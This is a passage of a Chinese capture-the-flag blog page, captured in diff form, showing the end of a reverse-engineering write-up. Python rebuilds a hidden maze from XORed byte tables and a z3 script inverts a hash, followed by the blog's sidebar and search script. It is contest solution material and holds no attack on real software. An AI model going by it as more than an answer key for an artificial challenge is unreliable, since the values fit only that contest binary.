class="number">0x57</span>, <span class="number">0x81</span>, <span class="number">0x23</span>, <span class="number">0xCA</span>, <span class="number">0xD4</span>, <span class="number">0xF1</span>,</span><br><span class="line">      <span class="number">0x7E</span>, <span class="number">0xF4</span>, <span class="number">0x65</span>, <span class="number">0x8D</span>, <span class="number">0x72</span>, <span class="number">0x6B</span>, <span class="number">0xA4</span>, <span class="number">0x9A</span>, <span class="number">0xEE</span>, <span class="number">0xAC</span>, <span class="number">0xBA</span>, <span class="number">0x71</span>, <span class="number">0x4E</span>, <span class="number">0xDE</span>, <span class="number">0x6A</span>, <span class="number">0x88</span>, <span class="number">0x36</span>, <span class="number">0x1D</span>,</span><br><span class="line">      <span class="number">0x72</span>, <span class="number">0xB1</span>, <span class="number">0xF0</span>, <span class="number">0x9B</span>, <span class="number">0x69</span>, <span class="number">0x19</span>, <span class="number">0xB0</span>, <span class="number">0x7C</span>, <span class="number">0xEA</span>, <span class="number">0xF7</span>, <span class="number">0x51</span>, <span class="number">0x62</span>, <span class="number">0xD1</span>, <span class="number">0x3A</span>, <span class="number">0x67</span>, <span class="number">0x56</span>, <span class="number">0x66</span>, <span class="number">0xBA</span>,</span><br><span class="line">      <span class="number">0x79</span>, <span class="number">0x59</span>, <span class="number">0x66</span>, <span class="number">0xB1</span>, <span class="number">0xC5</span>, <span class="number">0x8F</span>, <span class="number">0xE9</span>, <span class="number">0x6C</span>, <span class="number">0x99</span>, <span class="number">0x3C</span>, <span class="number">0xF0</span>, <span class="number">0x89</span>, <span class="number">0xF6</span>, <span class="number">0xBF</span>, <span class="number">0x15</span>, <span class="number">0x61</span>, <span class="number">0x92</span>, <span class="number">0xE0</span>,</span><br><span class="line">      <span class="number">0x60</span>, <span class="number">0x3E</span>, <span class="number">0x59</span>, <span class="number">0x35</span>, <span class="number">0x4B</span>, <span class="number">0x1F</span>, <span class="number">0x6F</span>, <span class="number">0x65</span>, <span class="number">0xE4</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x7B</span>, <span class="number">0x6E</span>, <span class="number">0x93</span>, <span class="number">0x14</span>, <span class="number">0x5D</span>, <span class="number">0x4C</span>, <span class="number">0x6F</span>,</span><br><span class="line">      <span class="number">0x2F</span>, <span class="number">0x52</span>, <span class="number">0xA6</span>, <span class="number">0x5D</span>, <span class="number">0x90</span>, <span class="number">0x7B</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x8D</span>, <span class="number">0x33</span>, <span class="number">0x6B</span>, <span class="number">0x37</span>, <span class="number">0xC4</span>, <span class="number">0x2F</span>, <span class="number">0xBF</span>,</span><br><span class="line">      <span class="number">0x6F</span>, <span class="number">0xBF</span>, <span class="number">0xA8</span>, <span class="number">0xB3</span>, <span class="number">0x61</span>, <span class="number">0x5C</span>, <span class="number">0xD2</span>, <span class="number">0xC2</span>, <span class="number">0x2D</span>, <span class="number">0xC8</span>, <span class="number">0xF4</span>, <span class="number">0xBB</span>, <span class="number">0xB2</span>, <span class="number">0xD0</span>, <span class="number">0x22</span>, <span class="number">0x9C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>,</span><br><span class="line">      <span class="number">0x59</span>, <span class="number">0x72</span>, <span class="number">0xAA</span>, <span class="number">0xFD</span>, <span class="number">0x7E</span>, <span class="number">0x67</span>, <span class="number">0x2E</span>, <span class="number">0x61</span>, <span class="number">0xBA</span>, <span class="number">0x6B</span>, <span class="number">0x4B</span>, <span class="number">0x19</span>, <span class="number">0xA6</span>, <span class="number">0xD5</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0xBC</span>, <span class="number">0x91</span>,</span><br><span class="line">      <span class="number">0xEB</span>, <span class="number">0x42</span>, <span class="number">0xCC</span>, <span class="number">0x72</span>, <span class="number">0xB2</span>, <span class="number">0xC6</span>, <span class="number">0x47</span>, <span class="number">0xA3</span>, <span class="number">0xCC</span>, <span class="number">0xAC</span>, <span class="number">0x6C</span>, <span class="number">0xA8</span>, <span class="number">0xD8</span>, <span class="number">0xCA</span>, <span class="number">0xD2</span>, <span class="number">0x84</span>, <span class="number">0x2B</span>, <span class="number">0x35</span>,</span><br><span class="line">      <span class="number">0xAB</span>, <span class="number">0xAF</span>, <span class="number">0xC8</span>, <span class="number">0xA5</span>, <span class="number">0x2F</span>, <span class="number">0x7F</span>, <span class="number">0x7F</span>, <span class="number">0xF5</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">rs = [[<span class="number">0</span>] * <span class="number">21</span>] * <span class="number">21</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">21</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">21</span>):</span><br><span class="line">        rs[y][x] = (y ^ (x &lt;&lt; <span class="number">8</span>) ^ s1[y * <span class="number">21</span> + x] ^ s2[y * <span class="number">21</span> + x])</span><br><span class="line">    <span class="built_in">print</span>(rs[y])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>生成后的迷宫：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="line">[1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0]</span><br><span class="line">[1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</span><br><span class="line">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0]</span><br><span class="line">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0]</span><br><span class="line">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0]</span><br><span class="line">[0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0]</span><br><span class="line">[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0]</span><br><span class="line">[1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0]</span><br><span class="line">[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0]</span><br><span class="line">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0]</span><br><span class="line">[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0]</span><br><span class="line">[0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0]</span><br><span class="line">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1]</span><br></pre></td></tr></table></figure>
+
+<p>寻找迷宫出口的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = BitVec(<span class="string">&#x27;a&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add((((a &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>) ^ (<span class="number">16777619</span> * (((a &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) ^ (</span><br><span class="line">        <span class="number">16777619</span> * (((a &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) ^ (<span class="number">16777619</span> * ((a &amp; <span class="number">0xff</span>) ^ <span class="number">0x50C5D1F</span>))))))) == <span class="number">0x618FF339</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以发现迷宫的出口是<code>(20, 20)</code>，网上找一个迷宫求解的脚本跑一跑就可以出来了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E9%95%BF%E5%9F%8E%E6%9D%AF/" rel="tag"># 长城杯</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/08/23/CTF/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" rel="next" title="2022 巅峰极客">
+                <i class="fa fa-chevron-left"></i> 2022 巅峰极客
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/08/31/CTF/2022%E7%BD%91%E9%BC%8E%E6%9D%AF/" rel="prev" title="2022 网鼎杯 青龙组">
+                2022 网鼎杯 青龙组 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/wechat.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">61</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/pursuezhou" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:pursuezhou@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.eonew.cn/" title="Ex" target="_blank">Ex</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xianbeil.github.io/" title="XianBei" target="_blank">XianBei</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://whoamianony.top/" title="WHOAMI" target="_blank">WHOAMI</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.e4l4.com/" title="E4L4" target="_blank">E4L4</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tokameine.top/" title="Tokameine" target="_blank">Tokameine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://toleleyjl.github.io/" title="Tolele" target="_blank">Tolele</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          <div class="wechat_OA">
+    <br>
+    <span>Welcome to my wechat</span>
+    <p></p>
+    <img src ="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/wechat.jpg" width="150" height="150">
+</div>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#glibc-master"><span class="nav-number">1.</span> <span class="nav-text">glibc_master</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-re"><span class="nav-number">2.</span> <span class="nav-text">baby_re</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rabbit-hole"><span class="nav-number">3.</span> <span class="nav-text">rabbit_hole</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pursue</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
